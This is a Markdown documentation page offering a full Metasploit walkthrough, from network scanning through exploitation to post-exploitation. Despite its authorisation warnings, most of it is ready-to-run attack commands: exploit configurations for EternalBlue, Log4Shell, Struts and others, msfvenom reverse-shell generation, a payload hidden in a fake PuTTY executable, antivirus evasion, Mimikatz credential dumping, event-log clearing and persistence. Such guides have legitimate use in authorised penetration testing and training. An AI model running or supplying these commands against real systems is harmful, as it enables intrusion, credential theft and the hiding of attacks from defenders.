---
title: Metasploit Framework — Tips, Tricks & Hacker Mindset
description: Metasploit Framework from basic recon to advanced exploitation, post-exploitation, pivoting, and evasion techniques. Think like a hacker, defend like a pro.
navigation:
  icon: i-lucide-skull
  title: Metasploit Framework
---

Welcome to the dark arts of penetration testing. :icon{name="i-lucide-skull"} Whether you are a red teamer, bug bounty hunter, or a curious security enthusiast who whispers `msfconsole` in their sleep — this guide is your grimoire.

::warning
This guide is for **authorized penetration testing and educational purposes only**. Unauthorized access to computer systems is illegal. Always obtain written permission before testing. Don't be _that_ person. :icon{name="i-lucide-siren"}
::

## What is Metasploit Framework?

Metasploit is the world's most used penetration testing framework. Originally created by **HD Moore** in 2003 (written in Perl, then rewritten in Ruby because... Perl), it is now maintained by **Rapid7**.

::card-group
  ::card
  ---
  title: Exploit Modules
  icon: i-lucide-bug
  ---
  Over **2,300+** exploit modules targeting operating systems, web apps, network services, and more. If it has a CVE, Metasploit probably has a module.
  ::

  ::card
  ---
  title: Payload Generator
  icon: i-lucide-package
  ---
  Generate reverse shells, bind shells, meterpreter sessions, and staged/stageless payloads for every platform imaginable.
  ::

  ::card
  ---
  title: Post-Exploitation
  icon: i-lucide-footprints
  ---
  Privilege escalation, credential harvesting, lateral movement, persistence — everything you need _after_ you pop a shell.
  ::

  ::card
  ---
  title: Auxiliary & Scanners
  icon: i-lucide-scan-search
  ---
  Port scanners, service enumerators, fuzzers, brute-forcers, and network sniffers — recon on steroids.
  ::
::

## Installation

::tip
Metasploit comes **pre-installed** on Kali Linux and ParrotOS. If you are already running either, skip to the next section and start breaking things (legally).
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Kali / Parrot"}
  Already installed. Just update:

  ```bash [Terminal]
  sudo apt update && sudo apt install metasploit-framework -y
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Ubuntu / Debian"}
  ```bash [Terminal]
  curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
  chmod 755 msfinstall
  ./msfinstall
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="macOS"}
  ```bash [Terminal]
  brew install metasploit
  ```

  Yes, you can hack from a MacBook at Starbucks. No, you should not. :icon{name="i-lucide-coffee"}
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Docker"}
  ```bash [Terminal]
  docker pull metasploitframework/metasploit-framework
  docker run --rm -it metasploitframework/metasploit-framework ./msfconsole
  ```
  :::
::

### Database Setup

Metasploit loves PostgreSQL. Without it, you are driving a Ferrari in first gear.

```bash [Terminal]
sudo systemctl start postgresql
sudo systemctl enable postgresql
sudo msfdb init
```

Verify the connection inside `msfconsole`:

```bash [msf6>]
db_status
```

::code-collapse
```text [Expected Output]
[*] Connected to msf. Connection type: postgresql.
[*] PostgreSQL Selected as the Active Database.

    ╔══════════════════════════════════════════╗
    ║   You are now connected. Happy hacking. ║
    ╚══════════════════════════════════════════╝
```
::

## Architecture & Module Types

Understanding how Metasploit is organized separates script kiddies from actual operators.

| Module Type   | Purpose                                      | Example Path                                    |
| ------------- | -------------------------------------------- | ----------------------------------------------- |
| `exploits`    | Code that triggers a vulnerability           | `exploit/windows/smb/ms17_010_eternalblue`      |
| `payloads`    | Code that runs after exploitation            | `payload/windows/meterpreter/reverse_tcp`       |
| `auxiliary`   | Scanners, fuzzers, sniffers, brute-forcers   | `auxiliary/scanner/smb/smb_ms17_010`            |
| `post`        | Post-exploitation modules                    | `post/windows/gather/hashdump`                  |
| `encoders`    | Obfuscate payloads to evade detection        | `encoder/x86/shikata_ga_nai`                    |
| `nops`        | No-operation sleds for buffer overflows      | `nop/x86/opty2`                                 |
| `evasion`     | AV/EDR evasion payload generators            | `evasion/windows/windows_defender_exe`           |

```text [Module Hierarchy]
metasploit-framework/
├── modules/
│   ├── exploits/          ← 💀 The fun stuff
│   │   ├── windows/
│   │   ├── linux/
│   │   ├── multi/
│   │   └── ...
│   ├── payloads/          ← 📦 What runs after exploitation
│   │   ├── singles/
│   │   ├── stagers/
│   │   └── stages/
│   ├── auxiliary/         ← 🔍 Recon & scanning
│   ├── post/              ← 🦶 Post-exploitation
│   ├── encoders/          ← 🎭 Evasion
│   ├── evasion/           ← 🥷 Advanced evasion
│   └── nops/              ← 🛷 NOP sleds
├── data/
├── tools/
├── plugins/
└── scripts/
```

## Essential Commands Cheatsheet

Print this. Tattoo it. Whatever it takes.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Core Commands"}
  | Command                        | What it does                                    |
  | ------------------------------ | ----------------------------------------------- |
  | `msfconsole`                   | Launch the framework                            |
  | `help`                         | Show all available commands                     |
  | `search <keyword>`             | Search modules by name, CVE, platform           |
  | `use <module>`                 | Select a module                                 |
  | `info`                         | Show module details                             |
  | `show options`                 | Display required/optional settings               |
  | `set <OPTION> <value>`         | Set a module option                             |
  | `setg <OPTION> <value>`        | Set a global option (persists across modules)   |
  | `run` or `exploit`             | Execute the module                              |
  | `back`                         | Deselect current module                         |
  | `sessions`                     | List active sessions                            |
  | `sessions -i <id>`             | Interact with a session                         |
  :::

  :::tabs-item{icon="i-lucide-database" label="Database Commands"}
  | Command                        | What it does                                    |
  | ------------------------------ | ----------------------------------------------- |
  | `db_status`                    | Check database connection                       |
  | `workspace`                    | List/create/switch workspaces                   |
  | `workspace -a <name>`          | Create a new workspace                          |
  | `hosts`                        | List discovered hosts                           |
  | `services`                     | List discovered services                        |
  | `vulns`                        | List discovered vulnerabilities                 |
  | `creds`                        | List captured credentials                       |
  | `loot`                         | List captured loot (files, hashes)              |
  | `db_nmap <args>`               | Run Nmap and store results in DB                |
  | `db_import <file>`             | Import scan results (Nmap XML, Nessus, etc.)    |
  :::

  :::tabs-item{icon="i-lucide-search" label="Search Tricks"}
  | Search Query                           | What it finds                            |
  | -------------------------------------- | ---------------------------------------- |
  | `search eternalblue`                   | Modules matching "eternalblue"           |
  | `search type:exploit platform:windows` | Windows exploits only                    |
  | `search cve:2021-44228`                | Log4Shell modules                        |
  | `search name:smb type:auxiliary`       | SMB auxiliary modules                    |
  | `search rank:excellent`                | Only excellent-ranked (reliable) modules |
  | `search author:hdm`                    | Modules by HD Moore himself              |
  :::
::

## Phase 1 — Reconnaissance

::note
Good hackers spend **80% of their time on recon** and 20% on exploitation. Script kiddies do the opposite. Don't be a script kiddie.
::

### Network Discovery with db_nmap

```bash [msf6>]
workspace -a target_company
db_nmap -sV -sC -O -A -T4 -p- 192.168.1.0/24 -oX full_scan.xml
```

::field-group
  ::field{name="-sV" type="flag"}
  Service version detection — identifies what software is running on each port.
  ::

  ::field{name="-sC" type="flag"}
  Run default NSE scripts — basic vulnerability and enumeration checks.
  ::

  ::field{name="-O" type="flag"}
  OS detection — fingerprints the operating system.
  ::

  ::field{name="-A" type="flag"}
  Aggressive scan — combines `-sV`, `-sC`, `-O`, and traceroute.
  ::

  ::field{name="-T4" type="flag"}
  Timing template — faster scan (T0 = paranoid stealth, T5 = insane speed).
  ::

  ::field{name="-p-" type="flag"}
  Scan all 65,535 ports. Default only scans top 1,000. Rookies miss 64,535 ports.
  ::
::

### Targeted Service Scanning

::code-group
  ```bash [SMB Enumeration]
  use auxiliary/scanner/smb/smb_version
  set RHOSTS 192.168.1.0/24
  set THREADS 10
  run
  ```

  ```bash [HTTP Title Scanner]
  use auxiliary/scanner/http/title
  set RHOSTS 192.168.1.0/24
  set RPORT 80
  set THREADS 20
  run
  ```

  ```bash [SSH Version Scanner]
  use auxiliary/scanner/ssh/ssh_version
  set RHOSTS 192.168.1.0/24
  set THREADS 10
  run
  ```

  ```bash [FTP Anonymous Login]
  use auxiliary/scanner/ftp/anonymous
  set RHOSTS 192.168.1.0/24
  set THREADS 10
  run
  ```
::

### Vulnerability Scanning

```bash [msf6>]
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.100
run
```

::code-collapse
```text [Sample Output]
[+] 192.168.1.100:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.1.100:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

    ╔═══════════════════════════════════════╗
    ║  🎯  TARGET ACQUIRED. GAME ON.       ║
    ╚═══════════════════════════════════════╝
```
::

## Phase 2 — Exploitation

::caution
Only exploit systems you have **explicit written authorization** to test. Popping shells without permission pops you into prison. :icon{name="i-lucide-siren"}
::

### Classic — EternalBlue (MS17-010)

The exploit that powered WannaCry ransomware. Still finds unpatched machines in 2025. Incredible.

::steps{level="4"}

#### Search and Select

```bash [msf6>]
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
info
```

#### Configure the Exploit

```bash [msf6>]
show options
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

#### Verify Before Firing

```bash [msf6>]
check
```

::tip
Always run `check` first if the module supports it. It verifies vulnerability without actually exploiting — useful for assessments where you need to minimize impact.
::

#### Fire the Exploit

```bash [msf6>]
exploit
```

::code-collapse
```text [Successful Exploitation]
[*] Started reverse TCP handler on 192.168.1.50:4444
[*] 192.168.1.100:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.1.100:445     - Host is likely VULNERABLE to MS17-010!
[*] 192.168.1.100:445 - Connecting to target for exploitation.
[+] 192.168.1.100:445 - Connection established for exploitation.
[+] 192.168.1.100:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.1.100:445 - CORE raw buffer dump (42 bytes)
[*] 192.168.1.100:445 - 0x00000000  57 69 6e 64 6f 77 73 20  37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 192.168.1.100:445 - 0x00000010  73 69 6f 6e 61 6c 20 37  36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 192.168.1.100:445 - 0x00000020  69 63 65 20 50 61 63 6b  20 31                    ice Pack 1
[+] 192.168.1.100:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.1.100:445 - Sending egg to corrupted connection.
[*] 192.168.1.100:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 192.168.1.100
[*] Meterpreter session 1 opened (192.168.1.50:4444 -> 192.168.1.100:49162)

meterpreter > 💀
```
::

::

### Web Application Exploitation

::accordion
  :::accordion-item{icon="i-lucide-globe" label="Apache Struts RCE (CVE-2017-5638)"}
  ```bash [msf6>]
  use exploit/multi/http/struts2_content_type_ognl
  set RHOSTS 192.168.1.200
  set RPORT 8080
  set TARGETURI /struts2-showcase/
  set PAYLOAD linux/x64/meterpreter/reverse_tcp
  set LHOST 192.168.1.50
  exploit
  ```
  :::

  :::accordion-item{icon="i-lucide-globe" label="Tomcat Manager Upload (CVE-2017-12617)"}
  ```bash [msf6>]
  use exploit/multi/http/tomcat_mgr_upload
  set RHOSTS 192.168.1.200
  set RPORT 8080
  set HttpUsername admin
  set HttpPassword admin
  set PAYLOAD java/meterpreter/reverse_tcp
  set LHOST 192.168.1.50
  exploit
  ```
  :::

  :::accordion-item{icon="i-lucide-globe" label="Log4Shell (CVE-2021-44228)"}
  ```bash [msf6>]
  use exploit/multi/http/log4shell_header_injection
  set RHOSTS 192.168.1.200
  set RPORT 8080
  set HTTP_HEADER X-Api-Version
  set PAYLOAD java/meterpreter/reverse_tcp
  set LHOST 192.168.1.50
  set SRVPORT 1389
  exploit
  ```
  :::

  :::accordion-item{icon="i-lucide-globe" label="WordPress Plugin Upload"}
  ```bash [msf6>]
  use exploit/unix/webapp/wp_admin_shell_upload
  set RHOSTS 192.168.1.200
  set USERNAME admin
  set PASSWORD password123
  set TARGETURI /wordpress/
  set PAYLOAD php/meterpreter/reverse_tcp
  set LHOST 192.168.1.50
  exploit
  ```
  :::
::

### Linux Exploitation

::code-group
  ```bash [Samba Symlink Traversal]
  use exploit/linux/samba/is_known_pipename
  set RHOSTS 192.168.1.150
  set PAYLOAD linux/x64/meterpreter/reverse_tcp
  set LHOST 192.168.1.50
  exploit
  ```

  ```bash [Shellshock (CGI)]
  use exploit/multi/http/apache_mod_cgi_bash_env_exec
  set RHOSTS 192.168.1.150
  set TARGETURI /cgi-bin/vulnerable.cgi
  set PAYLOAD linux/x86/meterpreter/reverse_tcp
  set LHOST 192.168.1.50
  exploit
  ```

  ```bash [vsftpd 2.3.4 Backdoor]
  use exploit/unix/ftp/vsftpd_234_backdoor
  set RHOSTS 192.168.1.150
  exploit
  ```
::

## Phase 3 — Payload Mastery

Understanding payloads is what separates a button-pusher from an operator.

### Payload Types Explained

| Type              | Description                                                    | Example                                          |
| ----------------- | -------------------------------------------------------------- | ------------------------------------------------ |
| **Singles**       | Self-contained, one-shot payloads                              | `windows/shell_reverse_tcp`                      |
| **Stagers**       | Small payload that downloads the stage                         | `windows/meterpreter/reverse_tcp` (note the `/`) |
| **Stages**        | The actual payload downloaded by the stager                    | Meterpreter DLL loaded into memory               |
| **Stageless**     | Full payload in one shot (larger but fewer network artifacts)  | `windows/meterpreter_reverse_tcp` (note the `_`) |

::tip
**Pro tip:** Notice the difference between `/` and `_` in payload names:
- `reverse_tcp` with **/** = **staged** (two parts)
- `reverse_tcp` with **_** = **stageless** (one part)

This tiny character decides whether your payload is 5KB or 500KB. It also affects detection rates.
::

### Generating Payloads with msfvenom

`msfvenom` is the standalone payload generator. Your Swiss Army knife for creating shells.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Windows"}
  ```bash [Staged Meterpreter EXE]
  msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.50 \
    LPORT=4444 \
    -f exe \
    -o shell.exe
  ```

  ```bash [Stageless Meterpreter EXE]
  msfvenom -p windows/x64/meterpreter_reverse_tcp \
    LHOST=192.168.1.50 \
    LPORT=4444 \
    -f exe \
    -o shell_stageless.exe
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Linux"}
  ```bash [ELF Reverse Shell]
  msfvenom -p linux/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.50 \
    LPORT=4444 \
    -f elf \
    -o shell.elf
  ```

  ```bash [Python Reverse Shell]
  msfvenom -p python/meterpreter/reverse_tcp \
    LHOST=192.168.1.50 \
    LPORT=4444 \
    -o shell.py
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="macOS"}
  ```bash [Mach-O Reverse Shell]
  msfvenom -p osx/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.50 \
    LPORT=4444 \
    -f macho \
    -o shell.macho
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Web Payloads"}
  ```bash [PHP]
  msfvenom -p php/meterpreter/reverse_tcp \
    LHOST=192.168.1.50 \
    LPORT=4444 \
    -f raw \
    -o shell.php
  ```

  ```bash [ASP]
  msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=192.168.1.50 \
    LPORT=4444 \
    -f asp \
    -o shell.asp
  ```

  ```bash [JSP]
  msfvenom -p java/jsp_shell_reverse_tcp \
    LHOST=192.168.1.50 \
    LPORT=4444 \
    -f raw \
    -o shell.jsp
  ```

  ```bash [WAR]
  msfvenom -p java/jsp_shell_reverse_tcp \
    LHOST=192.168.1.50 \
    LPORT=4444 \
    -f war \
    -o shell.war
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Shellcode"}
  ```bash [C Shellcode]
  msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.50 \
    LPORT=4444 \
    -f c \
    -b '\x00'
  ```

  ```bash [Python Shellcode]
  msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.50 \
    LPORT=4444 \
    -f python \
    -b '\x00'
  ```

  ```bash [PowerShell Shellcode]
  msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.50 \
    LPORT=4444 \
    -f psh-cmd
  ```
  :::
::

### Multi Handler — Catching Shells

Every payload needs a listener. `multi/handler` is the universal catcher.

```bash [msf6>]
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j
```

::field-group
  ::field{name="ExitOnSession" type="boolean"}
  Set to `false` to keep the listener running after catching a session. Essential when expecting multiple callbacks.
  ::

  ::field{name="-j" type="flag"}
  Run the handler as a background job. Keeps your console free.
  ::

  ::field{name="0.0.0.0" type="LHOST"}
  Listen on all interfaces. Use this on your attack machine so it catches shells regardless of which network interface the connection arrives on.
  ::
::

## Phase 4 — Post-Exploitation

You popped a shell. Now what? This is where the real work begins.

::note
Post-exploitation is the **art** of turning initial access into full domain compromise. Every meterpreter command you run should have a purpose.
::

### Meterpreter Essential Commands

::tabs
  :::tabs-item{icon="i-lucide-info" label="System Info"}
  | Command             | Purpose                                          |
  | ------------------- | ------------------------------------------------ |
  | `sysinfo`           | OS, architecture, hostname, domain               |
  | `getuid`            | Current user context                             |
  | `getpid`            | Current process ID                               |
  | `ps`                | List running processes                           |
  | `idletime`          | How long the user has been idle                  |
  | `localtime`         | Target's local time                              |
  | `ipconfig`          | Network interface configuration                  |
  | `route`             | Routing table                                    |
  | `arp`               | ARP cache                                        |
  :::

  :::tabs-item{icon="i-lucide-file" label="File Operations"}
  | Command             | Purpose                                          |
  | ------------------- | ------------------------------------------------ |
  | `pwd`               | Current directory                                |
  | `ls`                | List files                                       |
  | `cd <dir>`          | Change directory                                 |
  | `cat <file>`        | Read file contents                               |
  | `download <file>`   | Download file to attacker                        |
  | `upload <file>`     | Upload file to target                            |
  | `edit <file>`       | Edit a file in-place                             |
  | `search -f *.txt`   | Search for files recursively                     |
  | `rm <file>`         | Delete a file                                    |
  | `mkdir <dir>`       | Create directory                                 |
  :::

  :::tabs-item{icon="i-lucide-shield" label="Privilege Escalation"}
  | Command             | Purpose                                          |
  | ------------------- | ------------------------------------------------ |
  | `getsystem`         | Attempt automatic privilege escalation            |
  | `getprivs`          | Show current privileges                          |
  | `steal_token <pid>` | Steal token from another process                 |
  | `migrate <pid>`     | Migrate to another process                       |
  | `load incognito`    | Load token manipulation extension                |
  | `list_tokens -u`    | List available tokens by user                    |
  | `impersonate_token` | Impersonate a user token                         |
  :::

  :::tabs-item{icon="i-lucide-key" label="Credential Harvesting"}
  | Command                        | Purpose                               |
  | ------------------------------ | ------------------------------------- |
  | `hashdump`                     | Dump SAM database hashes              |
  | `load kiwi`                    | Load Mimikatz extension               |
  | `creds_all`                    | Dump all credentials (kiwi)           |
  | `creds_msv`                    | Dump MSV credentials                  |
  | `creds_kerberos`               | Dump Kerberos tickets                 |
  | `creds_wdigest`                | Dump WDigest credentials (plaintext!) |
  | `wifi_list`                    | List saved WiFi profiles              |
  | `wifi_list_shared`             | Dump WiFi passwords                   |
  :::

  :::tabs-item{icon="i-lucide-ghost" label="Stealth & Evasion"}
  | Command                        | Purpose                               |
  | ------------------------------ | ------------------------------------- |
  | `timestomp <file> -z "01/01/2020 00:00:00"` | Modify file timestamps |
  | `clearev`                      | Clear Windows event logs              |
  | `migrate <pid>`                | Move to a stable/stealthy process     |
  | `sleep <seconds>`              | Go dormant to avoid detection         |
  | `transport add`                | Add backup communication channel      |
  :::
::

### Privilege Escalation Deep Dive

::steps{level="4"}

#### Check Current Privileges

```bash [meterpreter>]
getuid
getprivs
```

#### Attempt Automatic Escalation

```bash [meterpreter>]
getsystem
```

::tip
`getsystem` tries three techniques: Named Pipe Impersonation (in memory), Named Pipe Impersonation (dropper), and Token Duplication. If all fail, move to manual methods.
::

#### Local Exploit Suggester

When `getsystem` fails, let Metasploit find kernel exploits for you:

```bash [meterpreter>]
background
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

::code-collapse
```text [Sample Output]
[*] 192.168.1.100 - Collecting local exploits for x64/windows...
[*] 192.168.1.100 - 186 exploit checks are being tried...
[+] 192.168.1.100 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 192.168.1.100 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[+] 192.168.1.100 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated.
[+] 192.168.1.100 - exploit/windows/local/cve_2021_1732_win32k: The target appears to be vulnerable.
[*] Running check method for exploit 47 / 47
[*] 192.168.1.100 - Valid modules for session 1:

    #   Name                                                    Potentially Vulnerable?
    -   ----                                                    -----------------------
    1   exploit/windows/local/bypassuac_eventvwr                Yes
    2   exploit/windows/local/ms16_075_reflection_juicy         Yes
    3   exploit/windows/local/cve_2020_0787_bits_arbitrary      Yes
    4   exploit/windows/local/cve_2021_1732_win32k              Yes
```
::

#### UAC Bypass

```bash [msf6>]
use exploit/windows/local/bypassuac_eventvwr
set SESSION 1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 5555
exploit
```

::

### Credential Dumping — The Crown Jewels

::warning
Credential dumping is one of the most impactful post-exploitation techniques. On real engagements, **this is where you win or lose**. Handle harvested creds with extreme care.
::

::code-group
  ```bash [SAM Hash Dump]
  meterpreter > hashdump
  Administrator:500:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  user:1001:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
  ```

  ```bash [Mimikatz via Kiwi]
  meterpreter > load kiwi
  meterpreter > creds_all

  [+] Running as SYSTEM
  [*] Retrieving all credentials

  msv credentials
  ===============
  Username       Domain    NTLM                              SHA1
  --------       ------    ----                               ----
  Administrator  CORP      e02bc503339d51f71d913c245d35b50b   a]...
  jsmith         CORP      7facdc498ed1680c4fd1448319a8c04f   b]...

  wdigest credentials
  ===================
  Username       Domain    Password
  --------       ------    --------
  Administrator  CORP      P@ssw0rd!2024
  jsmith         CORP      Summer2024!
  ```

  ```bash [Post Module — Smart Hashdump]
  use post/windows/gather/smart_hashdump
  set SESSION 1
  set GETSYSTEM true
  run
  ```

  ```bash [Post Module — Cached Credentials]
  use post/windows/gather/cachedump
  set SESSION 1
  run
  ```
::

## Phase 5 — Pivoting & Lateral Movement

You own one machine. The network has hundreds. Time to pivot.

::note
Pivoting is what makes a pentest look like a real-world attack. You use the compromised machine as a stepping stone to reach internal networks that your attack machine cannot directly access.
::

```text [Network Diagram]
┌──────────────┐         ┌──────────────────┐         ┌──────────────────┐
│  Attacker    │         │  Compromised Box │         │  Internal Server │
│  10.0.0.5    │────────▶│  192.168.1.100   │────────▶│  10.10.10.50     │
│              │  WAN    │  10.10.10.1      │  LAN    │  (Not reachable  │
│              │         │                  │         │   from attacker) │
└──────────────┘         └──────────────────┘         └──────────────────┘
```

### Autoroute — The Easy Way

```bash [meterpreter>]
run autoroute -s 10.10.10.0/24
run autoroute -p
```

### SOCKS Proxy — The Pro Way

::steps{level="4"}

#### Set Up the Route

```bash [msf6>]
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 10.10.10.0
set NETMASK /24
run
```

#### Start SOCKS Proxy

```bash [msf6>]
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 5
run -j
```

#### Configure Proxychains

```ini [/etc/proxychains4.conf]
[ProxyList]
socks5 127.0.0.1 1080
```

#### Scan Through the Pivot

```bash [Terminal]
proxychains nmap -sT -Pn -p 445,3389,22,80 10.10.10.50
proxychains curl http://10.10.10.50
proxychains ssh admin@10.10.10.50
```

::

### Port Forwarding

```bash [meterpreter>]
# Forward local port to internal target
portfwd add -l 8080 -p 80 -r 10.10.10.50

# Now access internal web server from your browser
# http://127.0.0.1:8080 → 10.10.10.50:80

# Forward RDP
portfwd add -l 3389 -p 3389 -r 10.10.10.50

# Connect with your RDP client
# rdesktop 127.0.0.1
```

## Phase 6 — Evasion Techniques

::caution
Modern EDR/AV solutions catch default Metasploit payloads instantly. These techniques help bypass basic defenses for **authorized testing**. Real-world red team operations require custom tooling beyond what is covered here.
::

### Encoding Payloads

```bash [Single Encoding]
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 \
  LPORT=4444 \
  -e x86/shikata_ga_nai \
  -i 5 \
  -f exe \
  -o encoded_shell.exe
```

::field-group
  ::field{name="-e" type="flag"}
  Encoder to use. `shikata_ga_nai` is polymorphic — each encoding produces different output.
  ::

  ::field{name="-i" type="flag"}
  Number of encoding iterations. More iterations = more obfuscation (but diminishing returns after 5-7).
  ::

  ::field{name="-b" type="flag"}
  Bad characters to avoid (e.g. `-b '\x00\x0a\x0d'`).
  ::
::

### Template Injection

Hide your payload inside a legitimate executable:

```bash [Terminal]
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 \
  LPORT=4444 \
  -x /path/to/putty.exe \
  -k \
  -f exe \
  -o fake_putty.exe
```

::field-group
  ::field{name="-x" type="flag"}
  Template executable to inject into. The resulting file looks like the original application.
  ::

  ::field{name="-k" type="flag"}
  Keep the template functional — the original application still works while the payload runs in a separate thread.
  ::
::

### Evasion Modules

```bash [msf6>]
use evasion/windows/windows_defender_exe
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
run
```

### Advanced Evasion Strategies

::accordion
  :::accordion-item{icon="i-lucide-shield-off" label="Sleep & Jitter"}
  Add delays to avoid behavioral detection:

  ```bash [meterpreter>]
  set AutoRunScript "sleep 60"
  ```

  In your handler:

  ```bash [msf6>]
  set SessionCommunicationTimeout 0
  set EnableStageEncoding true
  set StageEncoder x64/zutto_dekiru
  ```
  :::

  :::accordion-item{icon="i-lucide-shield-off" label="HTTPS Encrypted Channel"}
  Use HTTPS payloads to encrypt C2 traffic and blend with normal web traffic:

  ```bash [Terminal]
  msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=192.168.1.50 \
    LPORT=443 \
    HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
    -f exe \
    -o https_shell.exe
  ```

  ```bash [msf6>]
  use exploit/multi/handler
  set PAYLOAD windows/x64/meterpreter/reverse_https
  set LHOST 0.0.0.0
  set LPORT 443
  set HandlerSSLCert /path/to/your/cert.pem
  exploit -j
  ```
  :::

  :::accordion-item{icon="i-lucide-shield-off" label="Process Migration"}
  Move your shell into a trusted process to avoid detection:

  ```bash [meterpreter>]
  # List processes
  ps

  # Migrate to explorer.exe or svchost.exe
  migrate -N explorer.exe

  # Or by PID
  migrate 1234
  ```

  :icon{name="i-lucide-lightbulb"} **Best targets:** `explorer.exe`, `svchost.exe`, `RuntimeBroker.exe` — processes that are always running and trusted.
  :::

  :::accordion-item{icon="i-lucide-shield-off" label="DNS Tunneling Payload"}
  When HTTP/HTTPS is blocked, use DNS to exfiltrate data:

  ```bash [Terminal]
  msfvenom -p windows/x64/meterpreter/reverse_dns \
    LHOST=192.168.1.50 \
    LPORT=53 \
    -f exe \
    -o dns_shell.exe
  ```
  :::
::

## Phase 7 — Persistence

::warning
Persistence mechanisms should only be deployed during authorized red team engagements and **must be removed** after the engagement. Document every persistence mechanism you install.
::

::code-group
  ```bash [Registry Run Key]
  meterpreter > run persistence -U -i 30 -p 4444 -r 192.168.1.50
  ```

  ```bash [Scheduled Task]
  use exploit/windows/local/persistence_service
  set SESSION 1
  set PAYLOAD windows/x64/meterpreter/reverse_tcp
  set LHOST 192.168.1.50
  set LPORT 5555
  run
  ```

  ```bash [Post Module]
  use post/windows/manage/persistence_exe
  set SESSION 1
  set REXEPATH /tmp/shell.exe
  set STARTUP SYSTEM
  run
  ```

  ```bash [SSH Key Persistence (Linux)]
  use post/linux/manage/sshkey_persistence
  set SESSION 1
  set CREATESSHFOLDER true
  run
  ```
::

## Phase 8 — Cleanup & Reporting

::note
A professional penetration tester always cleans up. Leaving backdoors, test accounts, or artifacts on client systems is **negligent and potentially illegal**.
::

### Cleanup Checklist

| Task                             | Command / Action                              |
| -------------------------------- | --------------------------------------------- |
| Remove uploaded files            | `rm <file>` in meterpreter                    |
| Remove persistence mechanisms    | Reverse every persistence step                |
| Clear event logs                 | `clearev` (or note that you did not for the report) |
| Close all sessions               | `sessions -K`                                 |
| Remove routes and proxies        | `route flush`                                 |
| Document everything              | Screenshots, timestamps, evidence             |

```bash [meterpreter>]
# Remove uploaded files
rm C:\\Users\\Public\\shell.exe

# Clear event logs (document this in your report)
clearev

# Background and kill session
background
sessions -k 1
```

## Resource Scripts — Automate Everything

Tired of typing the same commands? Resource scripts are your best friend.

```bash [auto_handler.rc]
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
set EnableStageEncoding true
set StageEncoder x64/zutto_dekiru
exploit -j

use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
set ExitOnSession false
exploit -j
```

```bash [Terminal]
msfconsole -r auto_handler.rc
```

```bash [auto_recon.rc]
workspace -a engagement_2025
db_nmap -sV -sC -O -T4 -p- 192.168.1.0/24
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
set THREADS 10
run
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
set THREADS 10
run
```

## Common Troubleshooting

::accordion
  :::accordion-item{icon="i-lucide-circle-help" label="Exploit runs but no session opens"}
  **Causes:**
  - Firewall blocking the reverse connection
  - Wrong `LHOST` — use your actual IP, not `127.0.0.1`
  - Payload architecture mismatch (x86 payload on x64 target)
  - AV/EDR killing the payload on execution

  **Fixes:**
  - Check `LHOST` with `ifconfig` / `ip a`
  - Try different ports (443, 8080, 53)
  - Use a stageless payload
  - Try a different payload format
  :::

